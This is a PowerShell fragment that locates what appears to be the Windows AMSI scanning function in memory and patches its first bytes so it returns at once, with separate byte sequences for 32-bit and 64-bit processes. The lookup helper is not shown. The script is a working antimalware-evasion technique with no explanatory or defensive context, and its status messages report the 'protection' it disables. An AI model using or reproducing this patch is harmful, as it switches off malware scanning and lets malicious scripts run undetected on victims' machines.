$ptr = [Win32]::FindAmsiFun();
if($ptr -eq 0)
{
	Write-Host "protection not found"
}
else
{
	if([IntPtr]::size -eq 4)
	{
		Write-Host "x32 protection detected"
		$buf = New-Object Byte[] 7
		$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00; #mov ax, 1 ;ret 0x18;
		$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
	}
	else
	{
		Write-Host "x64 protection detected"
		$buf = New-Object Byte[] 6
		$buf[0] = 0xb8; $buf[1] = 0x01; $buf[2] = 0x00; $buf[3] = 0x00; $buf[4] = 0x00; $buf[5] = 0xc3;  #mov eax, 1 ;ret;
		$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)
	}

}
